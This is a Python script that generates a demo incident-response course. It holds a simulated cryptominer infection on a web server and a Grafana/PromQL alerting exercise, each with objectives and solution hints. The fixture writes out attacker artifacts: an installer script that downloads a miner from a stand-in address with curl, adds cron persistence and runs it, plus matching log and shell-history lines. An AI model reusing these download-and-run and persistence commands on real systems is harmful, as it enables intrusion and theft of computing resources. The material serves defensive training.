#!/usr/bin/env python3
"""Generate Guru's built-in demo course (ui/demo/).

The demo is hand-authored to the exact shape Codex must produce, so it doubles
as the reference example and as a test fixture for both the Rust validator and
the JavaScript simulation engine. Run from the guru/ directory:

    python3 tools/make_demo.py
"""

import json
import os
import random

OUT = os.path.join(os.path.dirname(__file__), "..", "ui", "demo")


# ---------- helpers that emit the full, strict shape ----------

def effects(flags=(), node_status=(), message="", clear=()):
    return {
        "set_flags": list(flags),
        "clear_flags": list(clear),
        "node_status": [{"node_id": n, "status": s} for n, s in node_status],
        "message": message,
    }


def node(id, label, kind, status, detail, x, y):
    return {"id": id, "label": label, "kind": kind, "status": status, "detail": detail, "x": x, "y": y}


def rule(pattern, output, **eff):
    return {"pattern": pattern, "output": output, "effects": effects(**eff)}


def proc(pid, user, cpu, mem, command):
    return {"pid": pid, "user": user, "cpu": cpu, "mem": mem, "command": command}


def svc(name, status, detail):
    return {"name": name, "status": status, "detail": detail}


def w(type_, id_, title, **kw):
    d = {"type": type_, "id": id_, "title": title}
    d.update(kw)
    return d


def series(name, points):
    return {"name": name, "points": points}


def qresp(pattern, result, text="", columns=(), rows=(), labels=(), series_=(), **eff):
    return {
        "pattern": pattern,
        "result": result,
        "text": text,
        "columns": list(columns),
        "rows": [list(r) for r in rows],
        "labels": list(labels),
        "series": list(series_),
        "effects": effects(**eff),
    }


def field(id, label, kind, value="", options=()):
    return {"id": id, "label": label, "kind": kind, "options": list(options), "value": value}


def objective(id, text, kind, question="", options=(), correct=(), accept=(), flags=(), explanation=""):
    return {
        "id": id,
        "text": text,
        "kind": kind,
        "question": question,
        "options": list(options),
        "correct": list(correct),
        "accept": list(accept),
        "flags": list(flags),
        "explanation": explanation,
    }


def log(ts, level, message):
    return {"ts": ts, "level": level, "message": message}


random.seed(7)
LABELS = [f"02:{m:02d}" for m in range(40, 60, 2)] + [f"03:{m:02d}" for m in range(0, 40, 2)]


def noisy(base, spread, n):
    return [round(base + random.uniform(-spread, spread), 1) for _ in range(n)]


# ---------- simulation 1: infected web server (incident) ----------

def auth_log():
    lines = []
    users = ["admin", "root", "test", "oracle", "ubuntu", "postgres", "git", "deploy"]
    t = 0
    for i in range(46):
        t += random.randint(2, 9)
        m, s = divmod(t, 60)
        u = users[i % len(users)]
        lines.append(log(f"Nov 12 02:{48 + m:02d}:{s:02d}", "warn",
                         f"sshd[{21000 + i}]: Failed password for invalid user {u} from 203.0.113.45 port {40000 + i * 7} ssh2"))
        if i % 9 == 4:
            lines.append(log(f"Nov 12 02:{48 + m:02d}:{s:02d}", "info",
                             f"sshd[{21500 + i}]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2"))
    lines.append(log("Nov 12 03:11:58", "info", "sshd[21877]: Accepted password for deploy from 203.0.113.45 port 41822 ssh2"))
    lines.append(log("Nov 12 03:11:58", "info", "sshd[21877]: pam_unix(sshd:session): session opened for user deploy(uid=1001)"))
    lines.append(log("Nov 12 03:12:20", "warn", "sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/.x/x.sh"))
    lines.append(log("Nov 12 03:12:24", "warn", "sudo:   deploy : TTY=pts/1 ; PWD=/tmp/.x ; USER=root ; COMMAND=/bin/bash /tmp/.x/x.sh"))
    lines.append(log("Nov 12 03:20:02", "info", "CRON[22011]: (root) CMD (/tmp/.x/kworkerds -B >/dev/null 2>&1)"))
    return lines


def nginx_log():
    lines = []
    paths = ["/", "/api/products", "/api/cart", "/static/app.js", "/api/login", "/healthz"]
    for i in range(60):
        h = 2 if i < 30 else 3
        m = (40 + i) % 60 if i < 20 else (i - 20) % 60
        status = 200 if i % 13 else 502
        ms = random.randint(20, 90) if i < 34 else random.randint(400, 2400)
        lvl = "info" if status == 200 and ms < 1000 else "warn"
        lines.append(log(f"Nov 12 0{h}:{m:02d}:{random.randint(0,59):02d}", lvl,
                         f'198.51.100.{random.randint(2, 250)} "GET {paths[i % len(paths)]} HTTP/1.1" {status} rt={ms}ms'))
    lines.append(log("Nov 12 03:14:40", "error", "upstream timed out (110: Connection timed out) while reading response header from upstream, upstream: \"http://127.0.0.1:8080/api/cart\""))
    return lines


def syslog():
    return [
        log("Nov 12 03:12:25", "info", "systemd[1]: Started Session 4412 of user deploy."),
        log("Nov 12 03:12:31", "warn", "kernel: [884213.12] kworkerds[4242]: segfault at 0 ip 00007f… error 4 (ignored, restarted)"),
        log("Nov 12 03:13:00", "warn", "kernel: [884242.80] CPU3: Package temperature above threshold, cpu clock throttled"),
        log("Nov 12 03:15:00", "info", "systemd[1]: Starting Daily apt download activities..."),
        log("Nov 12 03:16:41", "error", "app[1880]: java.util.concurrent.TimeoutException: request /api/cart exceeded 2000ms"),
        log("Nov 12 03:21:10", "info", "systemd[1]: logrotate.service: Succeeded."),
    ]


def infected_sim():
    cpu_web01 = noisy(14, 4, 16) + noisy(97, 2, 14)
    cpu_web02 = noisy(16, 5, 30)
    latency = noisy(60, 15, 17) + noisy(1600, 500, 13)
    return {
        "id": "infected-web-01",
        "title": "3 a.m. page: web-01 is burning CPU",
        "kind": "incident",
        "tool": "Linux server, Grafana",
        "minutes": 25,
        "skill_ids": ["triage", "log_analysis", "containment"],
        "briefing": (
            "**PagerDuty, 03:24** — *High CPU on web-01 (97%) and checkout latency p95 > 1.5 s.*\n\n"
            "You are the on-call engineer. The shop runs behind a load balancer on two web servers "
            "(`web-01`, `web-02`) with one database. Nobody deployed tonight.\n\n"
            "1. Find out **what** is eating the CPU and **how** it got there.\n"
            "2. **Contain** it: stop the process, remove its persistence, block the source.\n\n"
            "Start on the map: click `web-01` to open its terminal and logs. The Grafana board is in the "
            "*Apps* tab."
        ),
        "world": {
            "nodes": [
                node("internet", "Internet", "cloud", "unknown", "Customers and… someone else", 6, 50),
                node("lb", "lb-01 (nginx)", "load_balancer", "healthy", "Round-robin to web-01, web-02", 28, 50),
                node("web01", "web-01", "server", "compromised", "Ubuntu 22.04 · 4 vCPU · CPU 97%", 52, 28),
                node("web02", "web-02", "server", "healthy", "Ubuntu 22.04 · 4 vCPU · CPU 16%", 52, 72),
                node("db", "db-01 (PostgreSQL)", "database", "healthy", "Primary database", 78, 50),
                node("mon", "Grafana", "app", "healthy", "Monitoring", 90, 14),
            ],
            "links": [
                {"from": "internet", "to": "lb", "label": "HTTPS"},
                {"from": "lb", "to": "web01", "label": ":8080"},
                {"from": "lb", "to": "web02", "label": ":8080"},
                {"from": "web01", "to": "db", "label": "5432"},
                {"from": "web02", "to": "db", "label": "5432"},
            ],
        },
        "hosts": [
            {
                "node_id": "web01",
                "hostname": "web-01",
                "user": "root",
                "cwd": "/root",
                "motd": "Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\nLast login: Tue Nov 12 03:11:58 2024 from 203.0.113.45",
                "files": [
                    {"path": "/var/log/auth.log", "content": "\n".join(f"{l['ts']} web-01 {l['message']}" for l in auth_log())},
                    {"path": "/var/log/nginx/access.log", "content": "\n".join(f"{l['ts']} {l['message']}" for l in nginx_log())},
                    {"path": "/var/log/syslog", "content": "\n".join(f"{l['ts']} web-01 {l['message']}" for l in syslog())},
                    {"path": "/etc/cron.d/sysupdate", "content": "# system update helper\n*/5 * * * * root /tmp/.x/kworkerds -B >/dev/null 2>&1\n"},
                    {"path": "/etc/cron.d/logrotate", "content": "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n"},
                    {"path": "/tmp/.x/x.sh", "content": "#!/bin/bash\n# installer\ncurl -s http://203.0.113.45/kworkerds -o /tmp/.x/kworkerds\nchmod +x /tmp/.x/kworkerds\necho '*/5 * * * * root /tmp/.x/kworkerds -B >/dev/null 2>&1' > /etc/cron.d/sysupdate\n/tmp/.x/kworkerds -B -o pool.example.com:3333 -u 4Bx9…wallet\n"},
                    {"path": "/tmp/.x/kworkerds", "content": "\u007fELF (binary, 2.1 MB) — strings: xmrig 6.21.0, randomx, pool.example.com:3333"},
                    {"path": "/tmp/.x/config.json", "content": "{\n  \"pools\": [{\"url\": \"pool.example.com:3333\", \"user\": \"4Bx9…wallet\"}],\n  \"cpu\": {\"max-threads-hint\": 100}\n}\n"},
                    {"path": "/home/deploy/.bash_history", "content": "cd /tmp\nmkdir .x\nsudo curl -s http://203.0.113.45/x.sh -o /tmp/.x/x.sh\nsudo bash /tmp/.x/x.sh\nhistory -c\n"},
                    {"path": "/etc/ssh/sshd_config", "content": "Port 22\nPermitRootLogin no\nPasswordAuthentication yes\nPubkeyAuthentication yes\nMaxAuthTries 6\n"},
                    {"path": "/opt/shop/application.properties", "content": "server.port=8080\nspring.datasource.url=jdbc:postgresql://db-01:5432/shop\nspring.datasource.hikari.maximum-pool-size=20\n"},
                ],
                "processes": [
                    proc(1, "root", 0.0, 0.1, "/sbin/init"),
                    proc(612, "root", 0.0, 0.2, "/usr/sbin/sshd -D"),
                    proc(1880, "shop", 2.1, 18.4, "java -Xmx1g -jar /opt/shop/shop.jar"),
                    proc(1903, "www-data", 0.4, 0.6, "nginx: worker process"),
                    proc(4242, "root", 389.7, 6.1, "/tmp/.x/kworkerds -B"),
                    proc(4250, "root", 0.0, 0.0, "[kworker/3:2-events]"),
                    proc(5120, "root", 0.0, 0.1, "-bash"),
                ],
                "services": [
                    svc("nginx", "active", "A high performance web server and a reverse proxy server"),
                    svc("shop", "active", "Shop Spring Boot application"),
                    svc("cron", "active", "Regular background program processing daemon"),
                    svc("ssh", "active", "OpenBSD Secure Shell server"),
                ],
                "commands": [
                    rule(r"^(sudo )?crontab -l( -u root)?$", "no crontab for root\n# (hint: system-wide jobs live in /etc/cron.d/)"),
                    rule(r"^(sudo )?(netstat|ss) -[a-z]*p[a-z]*$",
                         "Proto Local Address        Foreign Address        State       PID/Program\n"
                         "tcp   0.0.0.0:22           0.0.0.0:*              LISTEN      612/sshd\n"
                         "tcp   0.0.0.0:8080         0.0.0.0:*              LISTEN      1880/java\n"
                         "tcp   10.0.1.11:22         203.0.113.45:41822     ESTABLISHED 5120/sshd: deploy\n"
                         "tcp   10.0.1.11:51544      192.0.2.77:3333        ESTABLISHED 4242/kworkerds\n"
                         "tcp   10.0.1.11:40112      10.0.1.30:5432         ESTABLISHED 1880/java"),
                    rule(r"^(sudo )?ls -l[a-z]* /proc/4242/exe$", "lrwxrwxrwx 1 root root 0 Nov 12 03:12 /proc/4242/exe -> /tmp/.x/kworkerds"),
                    rule(r"^(sudo )?lsof -p 4242$", "COMMAND    PID USER  FD   TYPE DEVICE SIZE/OFF   NODE NAME\nkworkerds 4242 root  txt    REG  259,1  2203648 393311 /tmp/.x/kworkerds\nkworkerds 4242 root    5u  IPv4 991231      0t0    TCP web-01:51544->192.0.2.77:3333 (ESTABLISHED)"),
                    rule(r"^(sudo )?iptables -(A|I) INPUT .*-s 203\.0\.113\.45.*-j (DROP|REJECT)$", "",
                         flags=["blocked:203.0.113.45"], message="Firewall: traffic from 203.0.113.45 is now dropped."),
                    rule(r"^(sudo )?ufw (insert 1 )?deny from 203\.0\.113\.45.*$", "Rule inserted",
                         flags=["blocked:203.0.113.45"], message="Firewall: traffic from 203.0.113.45 is now dropped."),
                    rule(r"^(sudo )?iptables -(A|I) OUTPUT .*-d 192\.0\.2\.77.*-j (DROP|REJECT)$", "",
                         flags=["blocked:pool"], message="Outbound connection to the mining pool blocked."),
                    rule(r"^(sudo )?iptables -L.*$", "Chain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination"),
                    rule(r"^(sudo )?(passwd|chage) .*deploy.*$", "passwd: password updated successfully",
                         flags=["rotated:deploy"], message="deploy's password has been rotated."),
                    rule(r"^(sudo )?(free|free -[a-z]+)$", "               total        used        free      shared  buff/cache   available\nMem:            7951        2410         844          12        4697        5212\nSwap:              0           0           0"),
                    rule(r"^uptime$", " 03:26:11 up 10 days,  5:41,  1 user,  load average: 4.12, 4.03, 3.20"),
                    rule(r"^(sudo )?last( -n \d+)?$", "deploy   pts/1        203.0.113.45     Tue Nov 12 03:11   still logged in\ndeploy   pts/0        198.51.100.20    Mon Nov 11 17:02 - 17:40  (00:38)"),
                    rule(r"^(sudo )?pkill .*kworkerds.*$", "", flags=["killed:4242"], message="Process kworkerds (4242) terminated."),
                ],
            }
        ],
        "logs": [
            {"id": "auth", "name": "web-01 · /var/log/auth.log", "node_id": "web01", "lines": auth_log()},
            {"id": "nginx", "name": "web-01 · nginx access", "node_id": "web01", "lines": nginx_log()},
            {"id": "syslog", "name": "web-01 · syslog", "node_id": "web01", "lines": syslog()},
        ],
        "apps": [
            {
                "id": "grafana",
                "name": "Grafana (simulated)",
                "node_id": "mon",
                "accent": "#f46800",
                "screens": [
                    {
                        "id": "overview",
                        "title": "Shop · Node overview",
                        "widgets": [
                            w("stat", "s1", "web-01 CPU", value="97", unit="%", status="crit"),
                            w("stat", "s2", "web-02 CPU", value="16", unit="%", status="ok"),
                            w("stat", "s3", "Checkout p95", value="1.6", unit="s", status="crit"),
                            w("timeseries", "t1", "CPU busy by instance", unit="%", labels=LABELS,
                              series=[series("web-01", cpu_web01), series("web-02", cpu_web02)], thresholds=[85]),
                            w("timeseries", "t2", "HTTP p95 latency (ms)", unit="ms", labels=LABELS,
                              series=[series("checkout", latency)], thresholds=[1000]),
                            w("table", "tb", "Top outbound connections (web-01)", columns=["Remote", "Port", "Bytes/s"],
                              rows=[["192.0.2.77", "3333", "38 KB"], ["10.0.1.30", "5432", "210 KB"], ["203.0.113.45", "22", "2 KB"]]),
                        ],
                    }
                ],
            }
        ],
        "objectives": [
            objective("o1", "Identify the process burning the CPU", "answer",
                      question="Which process is consuming the CPU on web-01?",
                      options=["java (the shop app, PID 1880)", "kworkerds (PID 4242)", "nginx worker (PID 1903)", "[kworker/3:2-events] (PID 4250)"],
                      correct=[1],
                      explanation="PID 4242 runs from /tmp/.x — a hidden directory in /tmp. Real kernel workers are shown in [brackets] and never live on disk. The name imitates kworker to blend in."),
            objective("o2", "Find where the attacker came from", "answer",
                      question="From which IP address did the attacker log in?",
                      accept=[r"203\.0\.113\.45"],
                      explanation="auth.log shows a password brute force against many usernames from 203.0.113.45, then 'Accepted password for deploy' from the same address at 03:11:58."),
            objective("o3", "Name the persistence mechanism", "answer",
                      question="How would the miner come back after a reboot or kill?",
                      options=["A systemd service", "A cron job in /etc/cron.d/sysupdate", "~/.bashrc of deploy", "It would not come back"],
                      correct=[1],
                      explanation="x.sh wrote /etc/cron.d/sysupdate, which relaunches /tmp/.x/kworkerds every 5 minutes. Kill without removing it, and the miner is back within minutes."),
            objective("o4", "Stop the miner", "state", flags=["killed:4242"],
                      explanation="kill 4242 (or pkill kworkerds). In a real incident, capture evidence first: ls -l /proc/4242/exe, lsof -p 4242."),
            objective("o5", "Remove the persistence and the payload", "state",
                      flags=["removed:/etc/cron.d/sysupdate", "removed:/tmp/.x"],
                      explanation="rm /etc/cron.d/sysupdate and rm -rf /tmp/.x. Removing only one of them leaves the door open."),
            objective("o6", "Block the attacker's address", "state", flags=["blocked:203.0.113.45"],
                      explanation="iptables -I INPUT -s 203.0.113.45 -j DROP (or ufw deny from …). The real fix is to disable PasswordAuthentication in sshd_config and rotate deploy's credentials."),
        ],
        "hints": [
            "Start with what is using the CPU right now: `top` or `ps aux` on web-01.",
            "The process lives in a hidden directory. How did it get there? Read /var/log/auth.log (try `grep Accepted`) and the deploy user's history.",
            "Kill PID 4242, then `rm /etc/cron.d/sysupdate` and `rm -rf /tmp/.x`, then `iptables -I INPUT -s 203.0.113.45 -j DROP`.",
        ],
        "debrief": (
            "### What happened\n"
            "An SSH **password brute force** from `203.0.113.45` guessed the password of the `deploy` user "
            "(`PasswordAuthentication yes`). The attacker used deploy's sudo rights to download `x.sh`, which installed "
            "an XMRig **crypto miner** disguised as `kworkerds` in `/tmp/.x`, and a **cron job** to relaunch it every 5 minutes.\n\n"
            "### How professionals handle it\n"
            "1. **Triage** from symptoms: `top` → suspicious PID → `ls -l /proc/<pid>/exe`, `lsof -p`, `ss -tnp`.\n"
            "2. **Scope**: auth logs for the entry point (`grep Accepted /var/log/auth.log`), shell history, new cron/systemd units.\n"
            "3. **Contain**: kill, remove persistence *and* payload, block the IPs — after capturing evidence.\n"
            "4. **Eradicate & harden**: disable password SSH logins, rotate credentials, restrict sudo, and in production "
            "**rebuild the host from a clean image**: you cannot fully trust a machine that had root compromise.\n\n"
            "### Prevent it\n`PasswordAuthentication no`, fail2ban or rate limits, least-privilege sudo, and alerts on new cron "
            "entries and outbound connections to unusual ports (3333 is a classic mining-pool port)."
        ),
    }


# ---------- simulation 2: Grafana + PromQL (tool) ----------

def api_log():
    lines = []
    routes = [("GET", "/api/cart"), ("GET", "/api/products"), ("POST", "/api/checkout"), ("GET", "/healthz")]
    for i in range(36):
        m, sec = divmod(i * 9, 60)
        method, route = routes[i % 4]
        ms = random.randint(15, 70)
        lines.append(log(f"03:{m:02d}:{sec:02d}", "info", f"{method} {route} 200 {ms}ms instance=api-{'ab'[i % 2]}"))
    lines += [
        log("03:02:11", "warn", "payment-provider slow response 1800ms (timeout 2000ms)"),
        log("03:03:58", "warn", "payment-provider slow response 1950ms (timeout 2000ms)"),
        log("03:04:40", "error", "POST /api/checkout 503 upstream payment-provider unavailable instance=api-a"),
        log("03:04:41", "error", "POST /api/checkout 503 upstream payment-provider unavailable instance=api-b"),
        log("03:04:52", "warn", "GC pause 310ms (heap 1.6G/2G) instance=api-b"),
        log("03:05:02", "error", "circuit breaker OPEN for payment-provider (50% failures over 20 calls)"),
        log("03:05:32", "info", "circuit breaker HALF_OPEN for payment-provider"),
        log("03:05:33", "error", "POST /api/checkout 503 upstream payment-provider unavailable instance=api-a"),
    ]
    lines.sort(key=lambda l: l["ts"])
    return lines


def grafana_sim():
    req = noisy(120, 15, 30)
    err = [round(v, 2) for v in noisy(0.4, 0.3, 22) + noisy(6.5, 1.0, 8)]
    cpu_a = noisy(35, 6, 30)
    cpu_b = noisy(78, 8, 30)
    return {
        "id": "grafana-alerting",
        "title": "Build the on-call dashboard and alert in Grafana",
        "kind": "tool",
        "tool": "Grafana + Prometheus",
        "minutes": 25,
        "skill_ids": ["promql", "dashboards", "alerting"],
        "briefing": (
            "Your team just installed Prometheus, but nobody can see anything yet. In this **simulated Grafana** you will:\n\n"
            "1. Connect the **Prometheus data source** (it runs at `http://prometheus:9090`).\n"
            "2. Use **Explore** to write the PromQL queries an on-call engineer needs.\n"
            "3. Create an **alert rule** that pages when the 5xx error rate stays above 5% for 5 minutes.\n\n"
            "Open *Grafana (simulated)* in the Apps tab. Everything behaves like the real tool's workflow: "
            "Connections → Data sources, Explore, Alerting → Alert rules."
        ),
        "world": {
            "nodes": [
                node("api", "checkout-api (×2)", "service", "degraded", "Exposes /metrics", 20, 50),
                node("prom", "Prometheus", "service", "healthy", "Scrapes every 15s", 50, 50),
                node("graf", "Grafana", "app", "healthy", "Dashboards & alerting", 80, 50),
            ],
            "links": [
                {"from": "prom", "to": "api", "label": "scrape /metrics"},
                {"from": "graf", "to": "prom", "label": "PromQL"},
            ],
        },
        "hosts": [],
        "logs": [
            {"id": "api", "name": "checkout-api · application log", "node_id": "api", "lines": api_log()},
        ],
        "apps": [
            {
                "id": "grafana",
                "name": "Grafana (simulated)",
                "node_id": "graf",
                "accent": "#f46800",
                "screens": [
                    {
                        "id": "datasources",
                        "title": "Connections › Data sources",
                        "widgets": [
                            w("markdown", "md1", "Add data source",
                              text="Grafana needs a **data source** before any panel can show data. Choose the type and the URL Grafana's *server* uses to reach it (not your browser)."),
                            w("form", "ds", "Prometheus settings",
                              fields=[
                                  field("type", "Type", "select", "Prometheus", ["Prometheus", "Loki", "PostgreSQL", "Elasticsearch"]),
                                  field("url", "Prometheus server URL", "text", "http://localhost:9090"),
                                  field("scrape", "Scrape interval", "text", "15s"),
                              ],
                              submit_label="Save & test",
                              rules=[
                                  {"conditions": [{"field": "type", "pattern": "^Prometheus$"}, {"field": "url", "pattern": r"^https?://prometheus:9090/?$"}],
                                   "ok": True, "message": "✔ Successfully queried the Prometheus API.",
                                   "effects": effects(flags=["datasource_ok"], message="Data source connected.")},
                                  {"conditions": [{"field": "url", "pattern": "localhost|127\\.0\\.0\\.1"}],
                                   "ok": False, "message": "✖ Post \"http://localhost:9090/api/v1/query\": dial tcp 127.0.0.1:9090: connect: connection refused — localhost here means the Grafana container itself, not Prometheus.",
                                   "effects": effects()},
                              ],
                              fallback="✖ Error reading Prometheus: bad_response: the server did not respond with a Prometheus API. Check type and URL."),
                        ],
                    },
                    {
                        "id": "explore",
                        "title": "Explore",
                        "widgets": [
                            w("markdown", "md2", "Metrics available",
                              text="`http_requests_total{job, instance, route, status}` (counter) · `http_request_duration_seconds_bucket{le, route}` (histogram) · `node_cpu_seconds_total{mode, instance}` (counter) · `up`"),
                            w("query", "q", "Query (PromQL)", language="PromQL", placeholder="e.g. up",
                              responses=[
                                  qresp(r"^up$", "table", columns=["instance", "job", "value"],
                                        rows=[["api-a:8080", "checkout-api", "1"], ["api-b:8080", "checkout-api", "1"], ["prometheus:9090", "prometheus", "1"]]),
                                  qresp(r"^http_requests_total$", "text",
                                        text="Raw counter values only ever go up (e.g. 1 830 442). A counter is useless on its own: wrap it in rate() to get requests per second."),
                                  qresp(r"^sum\s*(by\s*\(\s*\w+\s*\)\s*)?\(\s*rate\(\s*http_requests_total(\{[^}]*\})?\[\s*\d+[sm]\s*\]\s*\)\s*\)(\s*by\s*\(\s*\w+\s*\))?$",
                                        "timeseries", labels=LABELS, series_=[series("req/s", req)],
                                        flags=["query:rate"], message="Nice: rate() over a counter → requests per second."),
                                  qresp(r"rate\(\s*http_requests_total\{[^}]*status\s*=~\s*\"5\.\.\"[^}]*\}\[\s*\d+[sm]\s*\]\s*\)\s*\)?\s*/\s*sum\s*(by\s*\(\s*\w+\s*\)\s*)?\(\s*rate\(\s*http_requests_total(\{[^}]*\})?\[\s*\d+[sm]\s*\]",
                                        "timeseries", labels=LABELS, series_=[series("5xx ratio %", err)],
                                        flags=["query:error_ratio"], message="That's the error ratio: 5xx rate ÷ total rate. It crosses 5% at 03:04."),
                                  qresp(r"^rate\(\s*http_requests_total\[\s*\d+[sm]\s*\]\s*\)$", "timeseries", labels=LABELS,
                                        series_=[series("api-a /api/cart 200", noisy(40, 5, 30)), series("api-b /api/cart 200", noisy(38, 5, 30)), series("api-a /api/checkout 503", [0.0] * 22 + noisy(6, 1, 8))],
                                        text="One line per label combination. Use sum by (…) to aggregate."),
                                  qresp(r"node_cpu_seconds_total\{[^}]*mode\s*=\s*\"idle\"[^}]*\}", "timeseries", labels=LABELS,
                                        series_=[series("api-a:9100", cpu_a), series("api-b:9100", cpu_b)],
                                        flags=["query:cpu"], message="CPU busy % per instance: api-b is running much hotter."),
                                  qresp(r"histogram_quantile\(\s*0?\.95\s*,", "table", columns=["route", "p95 (s)"],
                                        rows=[["/api/checkout", "1.84"], ["/api/cart", "0.12"], ["/api/products", "0.07"]],
                                        flags=["query:p95"], message="p95 from a histogram: histogram_quantile over rate() of the _bucket series, summed by le."),
                                  qresp(r"^\s*rate\(\s*http_requests_total\s*\)\s*$", "error",
                                        text="bad_data: 1:6: parse error: expected type range vector in call to function \"rate\", got instant vector — add a range, e.g. [5m]"),
                              ],
                              fallback="No data. Check the metric name and labels. Tip: counters need rate(…[5m]); aggregate with sum by (label)."),
                        ],
                    },
                    {
                        "id": "alerting",
                        "title": "Alerting › Alert rules › New",
                        "widgets": [
                            w("markdown", "md3", "Alert rule",
                              text="A rule = **query** + **condition** + **pending period** (`for`). The pending period stops one bad scrape from waking someone up."),
                            w("form", "alert", "New alert rule",
                              fields=[
                                  field("name", "Rule name", "text", ""),
                                  field("query", "Query (PromQL)", "textarea", ""),
                                  field("op", "Condition", "select", "IS ABOVE", ["IS ABOVE", "IS BELOW"]),
                                  field("threshold", "Threshold", "number", ""),
                                  field("for", "Pending period", "select", "0s", ["0s", "1m", "5m", "15m"]),
                                  field("severity", "Label severity", "select", "warning", ["info", "warning", "critical"]),
                              ],
                              submit_label="Save rule",
                              rules=[
                                  {"conditions": [{"field": "query", "pattern": "status\\s*=~\\s*\"5\\.\\.\".*/"},
                                                  {"field": "op", "pattern": "ABOVE"},
                                                  {"field": "threshold", "pattern": "^(0?\\.05|5)$"},
                                                  {"field": "for", "pattern": "^5m$"}],
                                   "ok": True, "message": "✔ Rule saved. State: Pending → Firing (error ratio 6.4% for 5m).",
                                   "effects": effects(flags=["alert_created"], node_status=[("api", "degraded")], message="Alert 'High 5xx ratio' is FIRING.")},
                                  {"conditions": [{"field": "for", "pattern": "^0s$"}],
                                   "ok": False, "message": "✖ Saved, but with a 0s pending period this would page on every brief spike. On-call engineers will hate you. Use 5m.",
                                   "effects": effects()},
                                  {"conditions": [{"field": "query", "pattern": "^\\s*sum\\s*\\(\\s*rate\\(\\s*http_requests_total(\\{\\})?\\[[^\\]]+\\]\\s*\\)\\s*\\)\\s*$"}],
                                   "ok": False, "message": "✖ That query is total traffic, not errors. Alert on the 5xx *ratio* (errors ÷ all requests).",
                                   "effects": effects()},
                              ],
                              fallback="✖ The rule doesn't match the requirement: 5xx ratio above 5% (0.05) for 5m. Check the query, threshold and pending period."),
                        ],
                    },
                ],
            }
        ],
        "objectives": [
            objective("g1", "Connect Prometheus as a data source", "state", flags=["datasource_ok"],
                      explanation="Grafana's server reaches Prometheus by its service name: http://prometheus:9090. 'localhost' would point at Grafana itself."),
            objective("g2", "Chart total request throughput", "state", flags=["query:rate"],
                      explanation="sum(rate(http_requests_total[5m])). Counters only increase; rate() turns them into per-second values."),
            objective("g3", "Chart the 5xx error ratio", "state", flags=["query:error_ratio"],
                      explanation="sum(rate(http_requests_total{status=~\"5..\"}[5m])) / sum(rate(http_requests_total[5m]))"),
            objective("g4", "Find the slowest route", "answer", question="Which route has the worst p95 latency?",
                      options=["/api/cart", "/api/products", "/api/checkout", "/metrics"], correct=[2],
                      explanation="histogram_quantile(0.95, sum by (le, route) (rate(http_request_duration_seconds_bucket[5m]))) shows /api/checkout at 1.84 s."),
            objective("g5", "Create an alert: 5xx ratio > 5% for 5 minutes", "state", flags=["alert_created"],
                      explanation="Alert on symptoms users feel (error ratio), with a pending period so it fires on sustained problems only."),
        ],
        "hints": [
            "Start in Connections › Data sources. Which hostname does Grafana use to reach Prometheus?",
            "In Explore, counters need rate(metric[5m]); wrap in sum(...) to aggregate.",
            "Error ratio: sum(rate(http_requests_total{status=~\"5..\"}[5m])) / sum(rate(http_requests_total[5m])) — then alert IS ABOVE 0.05 for 5m.",
        ],
        "debrief": (
            "### What you practised\n"
            "- **Data sources**: Grafana queries from its server, so URLs must resolve *there*.\n"
            "- **PromQL fundamentals**: `rate()` on counters, `sum by (label)`, ratios, and `histogram_quantile` for latency percentiles.\n"
            "- **Alerting**: alert on user-facing symptoms (error ratio, latency), with a pending period to avoid flapping pages.\n\n"
            "### On the real tool\nThe same steps in Grafana 10/11: *Connections → Data sources → Prometheus*, *Explore*, and "
            "*Alerting → Alert rules → New alert rule*. The PromQL is identical."
        ),
    }


# ---------- course manifest and modules ----------

def course():
    return {
        "format": 1,
        "slug": "demo-incident-response",
        "title": "Linux Incident Response & Monitoring (demo)",
        "topic": "Linux incident response and monitoring",
        "goal": "Handle a production incident from alert to fix",
        "level": 60,
        "level_label": "Intermediate",
        "hours": 1.5,
        "summary": "A built-in sample that shows how Guru courses work: two short lessons and two simulations, an infected server and a simulated Grafana. No AI and no installs needed.",
        "target_performance": "Triage and contain a compromised Linux host from symptoms and logs, and build the Grafana queries and alert that would have caught it.",
        "out_of_scope": ["Forensic imaging", "Kubernetes", "Log shipping pipelines"],
        "skills": [
            {"id": "triage", "name": "Process & network triage", "why": "Find what is wrong in minutes", "weight": 9},
            {"id": "log_analysis", "name": "Log analysis", "why": "Logs tell you how it happened", "weight": 8},
            {"id": "containment", "name": "Containment", "why": "Stop the bleeding without destroying evidence", "weight": 8},
            {"id": "promql", "name": "PromQL", "why": "Ask your metrics the right questions", "weight": 8},
            {"id": "dashboards", "name": "Dashboards & data sources", "why": "See the system at a glance", "weight": 6},
            {"id": "alerting", "name": "Alerting", "why": "Be paged for what matters, only", "weight": 7},
        ],
        "modules": [
            {"id": "m1", "title": "Triage a compromised Linux server", "minutes": 45,
             "summary": "From a CPU alert to root cause and containment using ps/top, ss, logs and cron.",
             "objectives": ["Find the offending process and its binary", "Trace the entry point in auth logs", "Contain: kill, remove persistence, block"],
             "skill_ids": ["triage", "log_analysis", "containment"],
             "sims": [{"id": "infected-web-01", "title": "3 a.m. page: web-01 is burning CPU", "kind": "incident", "tool": "Linux server, Grafana", "premise": "A crypto miner after an SSH brute force"}]},
            {"id": "m2", "title": "Monitoring with Grafana and PromQL", "minutes": 45,
             "summary": "Data sources, the PromQL you will use daily, and alerts that only page for real problems.",
             "objectives": ["Connect Prometheus", "Write rate/sum/ratio/quantile queries", "Create a symptom-based alert rule"],
             "skill_ids": ["promql", "dashboards", "alerting"],
             "sims": [{"id": "grafana-alerting", "title": "Build the on-call dashboard and alert in Grafana", "kind": "tool", "tool": "Grafana + Prometheus", "premise": "Fresh Prometheus, no dashboards, error spike tonight"}]},
        ],
        "capstone": {"id": "", "title": "", "kind": "", "tool": "", "premise": ""},
        "research": {"stackexchange_site": "serverfault", "tags": ["linux", "security"], "queries": ["high cpu unknown process"]},
        "status": "ready",
        "status_detail": "",
        "created_unix": 0,
        "generator": "hand-written demo",
    }


M1_LESSON = """## Why this matters
When a server misbehaves at 3 a.m., the first ten minutes decide whether you fix it or make it worse. A repeatable triage routine beats intuition.

## The mental model
Think in three questions, always in this order:

```
